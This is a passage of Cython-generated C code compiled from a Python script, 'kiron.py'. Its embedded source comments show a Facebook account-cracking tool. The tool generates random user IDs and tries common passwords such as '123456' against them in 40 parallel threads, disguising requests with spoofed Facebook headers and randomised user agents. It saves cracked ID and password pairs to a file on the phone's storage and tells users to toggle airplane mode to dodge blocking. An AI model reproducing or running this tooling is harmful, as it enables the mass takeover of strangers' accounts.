  __pyx_tuple__10 = PyTuple_Pack(2, __pyx_int_34, __pyx_int_38); if (unlikely(!__pyx_tuple__10)) __PYX_ERR(0, 146, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__10);
  __Pyx_GIVEREF(__pyx_tuple__10);

  /* "kiron.py":148
 *     bx=str(random.choice(range(34,38)))
 *     bz=f"5{bx}.{bV}"
 *     B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"             # <<<<<<<<<<<<<<
 *     cV=str(random.choice(range(1,36)))
 *     cx=str(random.choice(range(34,38)))
 */
  __pyx_tuple__12 = PyTuple_Pack(2, __pyx_int_12, __pyx_int_42); if (unlikely(!__pyx_tuple__12)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__12);
  __Pyx_GIVEREF(__pyx_tuple__12);
  __pyx_tuple__13 = PyTuple_Pack(2, __pyx_int_742, __pyx_int_2200); if (unlikely(!__pyx_tuple__13)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__13);
  __Pyx_GIVEREF(__pyx_tuple__13);
  __pyx_tuple__14 = PyTuple_Pack(2, __pyx_int_1, __pyx_int_120); if (unlikely(!__pyx_tuple__14)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__14);
  __Pyx_GIVEREF(__pyx_tuple__14);

  /* "kiron.py":153
 *     cz=f"5{cx}.{cV}"
 *     C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
 *     D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"             # <<<<<<<<<<<<<<
 *     return random.choice([A,B,C,D])
 * #-------------------// APPROVAL \\---------------------#
 */
  __pyx_tuple__15 = PyTuple_Pack(2, __pyx_int_1, __pyx_int_7120); if (unlikely(!__pyx_tuple__15)) __PYX_ERR(0, 153, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__15);
  __Pyx_GIVEREF(__pyx_tuple__15);

  /* "kiron.py":164
 *         menu()
 *     else:
 *         print("\x1b[38;5;244m KEY IS NOT APPROVED")             # <<<<<<<<<<<<<<
 *         os.system("clear")
 *         print(logo)
 */
  __pyx_tuple__16 = PyTuple_Pack(1, __pyx_kp_s_38_5_244m_KEY_IS_NOT_APPROVED); if (unlikely(!__pyx_tuple__16)) __PYX_ERR(0, 164, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__16);
  __Pyx_GIVEREF(__pyx_tuple__16);

  /* "kiron.py":167
 *         os.system("clear")
 *         print(logo)
 *         print("\x1b[1;97m\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m YOUR KEY IS NOT APPROVED ")             # <<<<<<<<<<<<<<
 *         print('\x1b[1;97m\033[1;37m')
 *         input(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m PRESS ENTER TO SEND KEY ADMIN > ')
 */
  __pyx_tuple__17 = PyTuple_Pack(1, __pyx_kp_s_1_97m_38_5_244m_1_97m_38_5_244m); if (unlikely(!__pyx_tuple__17)) __PYX_ERR(0, 167, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__17);
  __Pyx_GIVEREF(__pyx_tuple__17);

  /* "kiron.py":168
 *         print(logo)
 *         print("\x1b[1;97m\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m YOUR KEY IS NOT APPROVED ")
 *         print('\x1b[1;97m\033[1;37m')             # <<<<<<<<<<<<<<
 *         input(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m PRESS ENTER TO SEND KEY ADMIN > ')
 *         time.sleep(2)
 */
  __pyx_tuple__18 = PyTuple_Pack(1, __pyx_kp_s_1_97m_1_37m); if (unlikely(!__pyx_tuple__18)) __PYX_ERR(0, 168, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__18);
  __Pyx_GIVEREF(__pyx_tuple__18);

  /* "kiron.py":169
 *         print("\x1b[1;97m\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m YOUR KEY IS NOT APPROVED ")
 *         print('\x1b[1;97m\033[1;37m')
 *         input(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m PRESS ENTER TO SEND KEY ADMIN > ')             # <<<<<<<<<<<<<<
 *         time.sleep(2)
 *         tks = sexkey
 */
  __pyx_tuple__19 = PyTuple_Pack(1, __pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5); if (unlikely(!__pyx_tuple__19)) __PYX_ERR(0, 169, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__19);
  __Pyx_GIVEREF(__pyx_tuple__19);

  /* "kiron.py":190
 *        user=[]
 *        clear()
 *        print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;46mEXAMPLE : \x1b[38;5;46m3000\x1b[38;5;244m/\x1b[38;5;46m5000\x1b[38;5;244m/\x1b[38;5;46m10000\x1b[38;5;244m/\x1b[38;5;46m99999');linex()             # <<<<<<<<<<<<<<
 *        limit=input(f"\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;46mINPUT : ")
 *        clear()
 */
  __pyx_tuple__20 = PyTuple_Pack(1, __pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_2); if (unlikely(!__pyx_tuple__20)) __PYX_ERR(0, 190, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__20);
  __Pyx_GIVEREF(__pyx_tuple__20);

  /* "kiron.py":191
 *        clear()
 *        print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;46mEXAMPLE : \x1b[38;5;46m3000\x1b[38;5;244m/\x1b[38;5;46m5000\x1b[38;5;244m/\x1b[38;5;46m10000\x1b[38;5;244m/\x1b[38;5;46m99999');linex()
 *        limit=input(f"\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;46mINPUT : ")             # <<<<<<<<<<<<<<
 *        clear()
 *        print(f'\x1b[38;5;244m[\x1b[1;97m1\x1b[38;5;244m] \x1b[38;5;46mMETHOD \x1b[38;5;244m[\x1b[38;5;46m2009-2014\x1b[38;5;244m] \x1b[38;5;46m')
 */
  __pyx_tuple__21 = PyTuple_Pack(1, __pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_3); if (unlikely(!__pyx_tuple__21)) __PYX_ERR(0, 191, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__21);
  __Pyx_GIVEREF(__pyx_tuple__21);

  /* "kiron.py":193
 *        limit=input(f"\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;46mINPUT : ")
 *        clear()
 *        print(f'\x1b[38;5;244m[\x1b[1;97m1\x1b[38;5;244m] \x1b[38;5;46mMETHOD \x1b[38;5;244m[\x1b[38;5;46m2009-2014\x1b[38;5;244m] \x1b[38;5;46m')             # <<<<<<<<<<<<<<
 *        linex()
 *        ask=input(f"\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;46mINPUT : ")
 */
  __pyx_tuple__22 = PyTuple_Pack(1, __pyx_kp_u_38_5_244m_1_97m1_38_5_244m_38_5); if (unlikely(!__pyx_tuple__22)) __PYX_ERR(0, 193, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__22);
  __Pyx_GIVEREF(__pyx_tuple__22);

  /* "kiron.py":199
 *           star="10000"
 *           for i in range(int(limit)):
 *               data=str(random.choice(range(1000000000,9999999999)))             # <<<<<<<<<<<<<<
 *               user.append(data)
 *        else:
 */
  __pyx_tuple__23 = PyTuple_Pack(2, __pyx_int_1000000000, __pyx_int_9999999999); if (unlikely(!__pyx_tuple__23)) __PYX_ERR(0, 199, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__23);
  __Pyx_GIVEREF(__pyx_tuple__23);

  /* "kiron.py":204
 *         star="100000"
 *         for i in range(int(limit)):
 *             data=str(random.choice(range(100000000,999999999)))             # <<<<<<<<<<<<<<
 *             user.append(data)
 * 
 */
  __pyx_tuple__24 = PyTuple_Pack(2, __pyx_int_100000000, __pyx_int_999999999); if (unlikely(!__pyx_tuple__24)) __PYX_ERR(0, 204, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__24);
  __Pyx_GIVEREF(__pyx_tuple__24);

  /* "kiron.py":211
 *            print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m\x1b[38;5;46m TOTAL ID \x1b[38;5;244m\x1b[38;5;46m{A} {limit} ')
 *            print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m\x1b[38;5;46m METHOD \x1b[38;5;244m  \x1b[38;5;46m {A}M{ask}')
 *            print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m IF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE');linex()             # <<<<<<<<<<<<<<
 *            for mal in user:
 *               uid=star+mal
 */
  __pyx_tuple__26 = PyTuple_Pack(1, __pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_6); if (unlikely(!__pyx_tuple__26)) __PYX_ERR(0, 211, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__26);
  __Pyx_GIVEREF(__pyx_tuple__26);

  /* "kiron.py":207
 *             user.append(data)
 * 
 *        with tred(max_workers=40) as crack_submit:             # <<<<<<<<<<<<<<
 *            clear()
 *            print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m\x1b[38;5;46m TOTAL ID \x1b[38;5;244m\x1b[38;5;46m{A} {limit} ')
 */
  __pyx_tuple__27 = PyTuple_Pack(3, Py_None, Py_None, Py_None); if (unlikely(!__pyx_tuple__27)) __PYX_ERR(0, 207, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__27);
  __Pyx_GIVEREF(__pyx_tuple__27);

  /* "kiron.py":226
 *         sys.stdout.write(f'\r\x1b[38;5;244m[\x1b[38;5;46m{date}\x1b[38;5;244m]\x1b[38;5;244m\x1b[38;5;46m\x1b[38;5;244m[\x1b[38;5;46m{loop}\x1b[38;5;244m]\x1b[38;5;244m-\x1b[38;5;46m\x1b[38;5;244m[\x1b[38;5;46m{len(oks)}\x1b[38;5;244m/\x1b[38;5;46m{len(cps)}\x1b[38;5;244m]')
 *         sys.stdout.flush()
 *         for pw in ["123456","1234567","12345678","123456789","123123","112233","1234567890"]:             # <<<<<<<<<<<<<<
 *             headers = {
 *             "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
 */
  __pyx_tuple__28 = PyTuple_Pack(7, __pyx_kp_s_123456, __pyx_kp_s_1234567, __pyx_kp_s_12345678, __pyx_kp_s_123456789, __pyx_kp_s_123123, __pyx_kp_s_112233, __pyx_kp_s_1234567890); if (unlikely(!__pyx_tuple__28)) __PYX_ERR(0, 226, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__28);
  __Pyx_GIVEREF(__pyx_tuple__28);

  /* "kiron.py":228
 *         for pw in ["123456","1234567","12345678","123456789","123123","112233","1234567890"]:
 *             headers = {
 *             "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),             # <<<<<<<<<<<<<<
 *             "x-fb-sim-hni": str(random.randint(20000, 40000)),
 *             "x-fb-net-hni": str(random.randint(20000, 40000)),
 */
  __pyx_tuple__29 = PyTuple_Pack(2, __pyx_float_20000000_0, __pyx_float_30000000_0); if (unlikely(!__pyx_tuple__29)) __PYX_ERR(0, 228, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__29);
  __Pyx_GIVEREF(__pyx_tuple__29);

  /* "kiron.py":229
 *             headers = {
 *             "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
 *             "x-fb-sim-hni": str(random.randint(20000, 40000)),             # <<<<<<<<<<<<<<
 *             "x-fb-net-hni": str(random.randint(20000, 40000)),
 *             "x-fb-connection-quality": "EXCELLENT",
 */
  __pyx_tuple__30 = PyTuple_Pack(2, __pyx_int_20000, __pyx_int_40000); if (unlikely(!__pyx_tuple__30)) __PYX_ERR(0, 229, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__30);
  __Pyx_GIVEREF(__pyx_tuple__30);

  /* "kiron.py":239
 *             if "session_key" in rp:
 *                 print(f"\r\x1b[38;5;244m[\x1b[38;5;244mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;244m {uid} \x1b[38;5;244m\x1b[38;5;46m {pw}")
 *                 open("/sdcard/AYYUB-OLD.txt","a").write(uid+"|"+pw+"\n")             # <<<<<<<<<<<<<<
 *                 cps.append(uid)
 *                 break
 */
  __pyx_tuple__31 = PyTuple_Pack(2, __pyx_kp_s_sdcard_AYYUB_OLD_txt, __pyx_n_s_a); if (unlikely(!__pyx_tuple__31)) __PYX_ERR(0, 239, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__31);
  __Pyx_GIVEREF(__pyx_tuple__31);

  /* "kiron.py":281
 *                                     ps_limit =1
 *                                 clear()
 *                                 print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m \x1b[38;5;46mfirst last \x1b[38;5;244m|\x1b[38;5;46m first123')             # <<<<<<<<<<<<<<
 *                                 print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m \x1b[38;5;46m57273200 59039200 57575751 ');linex()
 *                                 for i in range(ps_limit):
 */
  __pyx_tuple__34 = PyTuple_Pack(1, __pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_7); if (unlikely(!__pyx_tuple__34)) __PYX_ERR(0, 281, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__34);
  __Pyx_GIVEREF(__pyx_tuple__34);

  /* "kiron.py":282
 *                                 clear()
 *                                 print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m \x1b[38;5;46mfirst last \x1b[38;5;244m|\x1b[38;5;46m first123')
 *                                 print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m \x1b[38;5;46m57273200 59039200 57575751 ');linex()             # <<<<<<<<<<<<<<
 *                                 for i in range(ps_limit):
 *                                     plist.append(input(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m PASSWORD NO {i+1} \x1b[38;5;244m\x1b[38;5;46m{A} '))
 */
  __pyx_tuple__35 = PyTuple_Pack(1, __pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_8); if (unlikely(!__pyx_tuple__35)) __PYX_ERR(0, 282, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__35);
  __Pyx_GIVEREF(__pyx_tuple__35);

  /* "kiron.py":310
 *                                                 elif mthd in ['2','02']:
 *                                                         crack_submit.submit(api2,ids,names,passlist)
 *                                 print('\033[1;37m')             # <<<<<<<<<<<<<<
 *                                 print(f'\r\x1b[1;97m\033[1;37m')
 *                                 print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m THE PROCESS HAS COMPLETED')
 */
  __pyx_tuple__36 = PyTuple_Pack(1, __pyx_kp_s_1_37m); if (unlikely(!__pyx_tuple__36)) __PYX_ERR(0, 310, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__36);
  __Pyx_GIVEREF(__pyx_tuple__36);

  /* "kiron.py":311
 *                                                         crack_submit.submit(api2,ids,names,passlist)
 *                                 print('\033[1;37m')
 *                                 print(f'\r\x1b[1;97m\033[1;37m')             # <<<<<<<<<<<<<<
 *                                 print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m THE PROCESS HAS COMPLETED')
 *                                 print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m TOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)))
 */
  __pyx_tuple__37 = PyTuple_Pack(1, __pyx_kp_u_1_97m_1_37m_2); if (unlikely(!__pyx_tuple__37)) __PYX_ERR(0, 311, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__37);
  __Pyx_GIVEREF(__pyx_tuple__37);

  /* "kiron.py":344
 *      mmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e','Realme','Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
 *      cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
 *      chorom = f"Chrome/"+str(random.randrange(99,499))+".0."+str(random.randrange(1111,9999))+"."+str(random.randrange(111,999))             # <<<<<<<<<<<<<<
 *      br_virshon = f"{str(random.randrange(11,99))}.1.0.{str(random.randrange(111,999))}.00"
 *      mobile = random.choice(moe)
 */
  __pyx_tuple__39 = PyTuple_Pack(2, __pyx_int_99, __pyx_int_499); if (unlikely(!__pyx_tuple__39)) __PYX_ERR(0, 344, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__39);
  __Pyx_GIVEREF(__pyx_tuple__39);
  __pyx_tuple__40 = PyTuple_Pack(2, __pyx_int_1111, __pyx_int_9999); if (unlikely(!__pyx_tuple__40)) __PYX_ERR(0, 344, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__40);
  __Pyx_GIVEREF(__pyx_tuple__40);
  __pyx_tuple__41 = PyTuple_Pack(2, __pyx_int_111, __pyx_int_999); if (unlikely(!__pyx_tuple__41)) __PYX_ERR(0, 344, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__41);
  __Pyx_GIVEREF(__pyx_tuple__41);

  /* "kiron.py":345
 *      cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
 *      chorom = f"Chrome/"+str(random.randrange(99,499))+".0."+str(random.randrange(1111,9999))+"."+str(random.randrange(111,999))
 *      br_virshon = f"{str(random.randrange(11,99))}.1.0.{str(random.randrange(111,999))}.00"             # <<<<<<<<<<<<<<
 *      mobile = random.choice(moe)
 *      cudiua1 = f"Mozilla/5.0 (Linux; arm_64; Android 10; "+kkkkki+f" Build/{str(bbbb)}) AppleWebKit/537.36 (KHTML, like Gecko) "+chorom+" YaBrowser/"+br_virshon+" SA/{str(rr(1,9))} Mobile Safari/{str(rr(511,599))}.{str(rr(30,39))}"
 */
  __pyx_tuple__42 = PyTuple_Pack(2, __pyx_int_11, __pyx_int_99); if (unlikely(!__pyx_tuple__42)) __PYX_ERR(0, 345, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__42);
  __Pyx_GIVEREF(__pyx_tuple__42);

  /* "kiron.py":348
 *      mobile = random.choice(moe)
 *      cudiua1 = f"Mozilla/5.0 (Linux; arm_64; Android 10; "+kkkkki+f" Build/{str(bbbb)}) AppleWebKit/537.36 (KHTML, like Gecko) "+chorom+" YaBrowser/"+br_virshon+" SA/{str(rr(1,9))} Mobile Safari/{str(rr(511,599))}.{str(rr(30,39))}"
 *      cudiua2 = f"Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(11,19))}.{str(rr(11,59))} (KHTML, like Gecko) Version/{chorom} Safari/{str(rr(1111,7999))}.25.{str(rr(17,89))}"             # <<<<<<<<<<<<<<
 *      cudiua3 = f"NokiaX{str(rr(1,9))}-0{str(rr(1,9))}/{str(rr(1,9))}.{str(rr(1,9))} ({str(rr(1,9))}Profile/MIDP-2.1 Configuration/CLDC-1.1UNTRUSTED/2.0"
 *      cudiua4 = f"Mozilla/5.0 (Linux; U; Android 10; en-us; "+mmp+" Build/"+bbbb+") AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+chorom+f" Mobile Safari/537.36 XiaoMi/MiuiBrowser/18.0.{str(rr(11111,66666))} swan-mibrowser"
 */
  __pyx_tuple__43 = PyTuple_Pack(2, __pyx_int_11, __pyx_int_19); if (unlikely(!__pyx_tuple__43)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__43);
  __Pyx_GIVEREF(__pyx_tuple__43);
  __pyx_tuple__44 = PyTuple_Pack(2, __pyx_int_11, __pyx_int_59); if (unlikely(!__pyx_tuple__44)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__44);
  __Pyx_GIVEREF(__pyx_tuple__44);
  __pyx_tuple__45 = PyTuple_Pack(2, __pyx_int_1111, __pyx_int_7999); if (unlikely(!__pyx_tuple__45)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__45);
  __Pyx_GIVEREF(__pyx_tuple__45);
  __pyx_tuple__46 = PyTuple_Pack(2, __pyx_int_17, __pyx_int_89); if (unlikely(!__pyx_tuple__46)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__46);
  __Pyx_GIVEREF(__pyx_tuple__46);

  /* "kiron.py":349
 *      cudiua1 = f"Mozilla/5.0 (Linux; arm_64; Android 10; "+kkkkki+f" Build/{str(bbbb)}) AppleWebKit/537.36 (KHTML, like Gecko) "+chorom+" YaBrowser/"+br_virshon+" SA/{str(rr(1,9))} Mobile Safari/{str(rr(511,599))}.{str(rr(30,39))}"
 *      cudiua2 = f"Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(11,19))}.{str(rr(11,59))} (KHTML, like Gecko) Version/{chorom} Safari/{str(rr(1111,7999))}.25.{str(rr(17,89))}"
 *      cudiua3 = f"NokiaX{str(rr(1,9))}-0{str(rr(1,9))}/{str(rr(1,9))}.{str(rr(1,9))} ({str(rr(1,9))}Profile/MIDP-2.1 Configuration/CLDC-1.1UNTRUSTED/2.0"             # <<<<<<<<<<<<<<
 *      cudiua4 = f"Mozilla/5.0 (Linux; U; Android 10; en-us; "+mmp+" Build/"+bbbb+") AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+chorom+f" Mobile Safari/537.36 XiaoMi/MiuiBrowser/18.0.{str(rr(11111,66666))} swan-mibrowser"
 *      cudiua5 = f"Mozilla/5.0 (Linux; arm_64; Android 10; "+str(mobile)+f" Build/{str(bbbb)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+chorom+f" YaApp_Android/{str(rr(111,999))}.10.1 YaSearchBrowser/{str(rr(11,44))}.{str(rr(11,44))}.1 BroPP/1.0 SA/3 Mobile Safari/537.36"
 */
  __pyx_tuple__47 = PyTuple_Pack(2, __pyx_int_1, __pyx_int_9); if (unlikely(!__pyx_tuple__47)) __PYX_ERR(0, 349, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__47);
  __Pyx_GIVEREF(__pyx_tuple__47);

  /* "kiron.py":350
 *      cudiua2 = f"Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(11,19))}.{str(rr(11,59))} (KHTML, like Gecko) Version/{chorom} Safari/{str(rr(1111,7999))}.25.{str(rr(17,89))}"
 *      cudiua3 = f"NokiaX{str(rr(1,9))}-0{str(rr(1,9))}/{str(rr(1,9))}.{str(rr(1,9))} ({str(rr(1,9))}Profile/MIDP-2.1 Configuration/CLDC-1.1UNTRUSTED/2.0"
 *      cudiua4 = f"Mozilla/5.0 (Linux; U; Android 10; en-us; "+mmp+" Build/"+bbbb+") AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+chorom+f" Mobile Safari/537.36 XiaoMi/MiuiBrowser/18.0.{str(rr(11111,66666))} swan-mibrowser"             # <<<<<<<<<<<<<<
 *      cudiua5 = f"Mozilla/5.0 (Linux; arm_64; Android 10; "+str(mobile)+f" Build/{str(bbbb)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+chorom+f" YaApp_Android/{str(rr(111,999))}.10.1 YaSearchBrowser/{str(rr(11,44))}.{str(rr(11,44))}.1 BroPP/1.0 SA/3 Mobile Safari/537.36"
 *      cudiua6 = f"Mozilla/5.0 (Windows NT {str(rr(7,11))}.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+chorom+f" Safari/537.36 Edg/{str(rr(11,99))}.0.{str(rr(311,999))}.59"
 */
  __pyx_tuple__49 = PyTuple_Pack(2, __pyx_int_11111, __pyx_int_66666); if (unlikely(!__pyx_tuple__49)) __PYX_ERR(0, 350, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__49);
  __Pyx_GIVEREF(__pyx_tuple__49);

  /* "kiron.py":351
 *      cudiua3 = f"NokiaX{str(rr(1,9))}-0{str(rr(1,9))}/{str(rr(1,9))}.{str(rr(1,9))} ({str(rr(1,9))}Profile/MIDP-2.1 Configuration/CLDC-1.1UNTRUSTED/2.0"
 *      cudiua4 = f"Mozilla/5.0 (Linux; U; Android 10; en-us; "+mmp+" Build/"+bbbb+") AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+chorom+f" Mobile Safari/537.36 XiaoMi/MiuiBrowser/18.0.{str(rr(11111,66666))} swan-mibrowser"
 *      cudiua5 = f"Mozilla/5.0 (Linux; arm_64; Android 10; "+str(mobile)+f" Build/{str(bbbb)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+chorom+f" YaApp_Android/{str(rr(111,999))}.10.1 YaSearchBrowser/{str(rr(11,44))}.{str(rr(11,44))}.1 BroPP/1.0 SA/3 Mobile Safari/537.36"             # <<<<<<<<<<<<<<
 *      cudiua6 = f"Mozilla/5.0 (Windows NT {str(rr(7,11))}.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+chorom+f" Safari/537.36 Edg/{str(rr(11,99))}.0.{str(rr(311,999))}.59"
 *      cudiua7 = f"Mozilla/5.0 (X11; Linux x86_64; Android {str(rr(7,13))}; {str(mobile)} Build/{str(bbbb)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(chorom)} Safari/{str(rr(511,599))}.{str(rr(30,39))}"
 */
  __pyx_tuple__50 = PyTuple_Pack(2, __pyx_int_11, __pyx_int_44); if (unlikely(!__pyx_tuple__50)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__50);
  __Pyx_GIVEREF(__pyx_tuple__50);

  /* "kiron.py":352
 *      cudiua4 = f"Mozilla/5.0 (Linux; U; Android 10; en-us; "+mmp+" Build/"+bbbb+") AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+chorom+f" Mobile Safari/537.36 XiaoMi/MiuiBrowser/18.0.{str(rr(11111,66666))} swan-mibrowser"
 *      cudiua5 = f"Mozilla/5.0 (Linux; arm_64; Android 10; "+str(mobile)+f" Build/{str(bbbb)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+chorom+f" YaApp_Android/{str(rr(111,999))}.10.1 YaSearchBrowser/{str(rr(11,44))}.{str(rr(11,44))}.1 BroPP/1.0 SA/3 Mobile Safari/537.36"
